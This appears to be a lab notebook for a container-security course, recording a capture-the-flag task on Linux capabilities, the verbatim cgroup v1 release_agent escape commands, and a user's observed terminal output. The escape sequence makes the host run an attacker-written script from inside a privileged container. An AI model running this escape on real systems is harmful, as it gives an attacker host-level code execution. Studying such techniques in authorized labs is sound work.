# Container Security Labs — Capabilities and Host Boundaries

**Status:** In progress — task 1 supplied, flag not yet recovered or verified  
**Recorded:** 2026-11-23 (America/Detroit)  
**Context:** Linux container security coursework / lab, reported by the user  
**Source:** User-provided text in this conversation, headed “Understanding Capabilities.” This is a task excerpt, not a verified record of execution.

## Goal

Work through container privilege boundaries, Linux capabilities and a lab demonstrating historical cgroup `release_agent` host interaction. Preserve the original explanation and record actual observations separately from proposed outcomes.

## Task 1 — Understanding Capabilities

The provided exercise introduces `capsh --print` from `libcap2-bin`, privileged Docker containers, and a historical cgroup v1 `release_agent` technique. It asks:

> Perform the exploit in this task on the lab machine. What is the value of the flag that has now been added to the container?

**Answer:** Unknown. No lab machine output or flag value has yet been supplied; do not infer one.

### User-supplied demonstration (verbatim commands)

```sh
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

These commands are preserved as **source evidence** from the supplied lab, not as a claim that they were run or that they work on a current host.

### Interpretation and corrections

- Linux capabilities divide traditionally root-only privileges into separate privileges assigned to threads/processes; effective, permitted, inheritable, bounding and ambient sets are relevant.
- Docker does **not** consist of only “user/normal” and “privileged” modes: rootless vs rootful engine, user namespaces, default capability sets, `--cap-add`, `--cap-drop`, seccomp, AppArmor/SELinux, and `--privileged` are distinct mechanisms.
- A privileged container **does not bypass the Docker Engine** at creation. Rather, Docker launches it with relaxed isolation and broad device/capability access; container processes still make syscalls to the shared host kernel.
- `CAP_SYS_ADMIN` covers many sensitive operations, including certain mount operations, but whether a particular operation succeeds depends on namespaces, seccomp/LSM restrictions, filesystem and cgroup mode.
- The demonstrated `notify_on_release`/`release_agent` behavior pertains to **cgroup v1** and is not automatically applicable to cgroup v2 or modern container setups. Treat the exercise as environment-specific, not a universal escape path.
- The example's `/home/cmnatic/flag.txt` is part of the lab. The flag value cannot be determined from these instructions alone.

### Evidence to collect during the lab

- Lab platform and time; container/kernel version when available.
- `capsh --print` output and `/proc/self/cgroup` observations.
- Whether the container uses cgroup v1 or v2 and whether the relevant interface is present.
- Exact command results (successes and errors) without retrospectively replacing them with the expected result.
- Final flag value **only when actually observed**; provenance of how it was retrieved.
- A correction log for differences between coursework prose and measured kernel/container behavior.

## Relationship to DERP

This is a separate coursework record, **not** a change to the deployed THOTH/CHARON/INFINITY containers and **not** an instruction to run escape experiments on the home lab. Preserve the original material, user observations and later interpretations with explicit status and timestamps.

## Next checkpoint

Run the authorized lab, capture actual terminal output, and reconcile the observed result with the exercise. Do not mark the lab completed on the strength of a repository commit.

## Task 1 — Observed container inspection (2026-11-23)

**Evidence type:** User-pasted terminal transcript; collected from the training container prompt `root@2225bfdee7ec`. This is observed terminal output, not independent host verification. Exact execution time was not supplied.

| Check | Observed evidence | Classification |
| --- | --- | --- |
| Identity | `uid=0(root) gid=0(root) groups=0(root)` | Observed |
| Effective capabilities | Broad effective/permitted set, including `cap_sys_admin`, `cap_sys_module`, `cap_sys_ptrace`; `capsh --print` also displayed a broad bounding set | Observed |
| cgroups | Multiple v1 controllers present, including `rdma`; `/proc/self/cgroup` also contains hierarchy `0::/docker/...` | Observed, hybrid/mixed layout not fully assessed |
| RDMA mount | `cgroup /tmp/cgrp cgroup rw,relatime,rdma,release_agent=/var/lib/docker/overlay2/.../diff/exploit` | Observed |
| Working directory | `/tmp/cgrp/x` exists and contains `cgroup.procs`, `notify_on_release`, `rdma.current`, `rdma.max`, `tasks` | Observed |
| Flag | No flag content or file listing shown | Unknown |

### Relevant command errors and reconciliation

- From `/tmp/cgrp/docker`, `cd x` failed because the `x` directory was at `/tmp/cgrp/x`. The user then changed to `/tmp/cgrp` and successfully entered `x`.
- Entering `cgroup.procs` by itself generated `-bash: cgroup.procs: command not found`; this is a pseudo-file, not a shell executable.
- The `release_agent` mount option references an overlay-backed `exploit` location, but the transcript does **not** show whether the file exists, was executed, or produced a flag. Do not promote the flag task to complete.
- A visible cgroup v1 RDMA hierarchy is consistent with the exercise; the transcript also contains a `0::` entry, so describing the system as exclusively v1 would overstate the observation.

### Next read-only evidence

Check for the exercise's expected container-side result before changing state:

```bash
printf '=== FLAG FILE CHECK ===\\n'
ls -l /flag.txt 2>&1
if [ -f /flag.txt ]; then cat /flag.txt; fi
printf '=== CHECK COMPLETE ===\\n'
```

If absent, record absence rather than assuming the host-side execution succeeded.
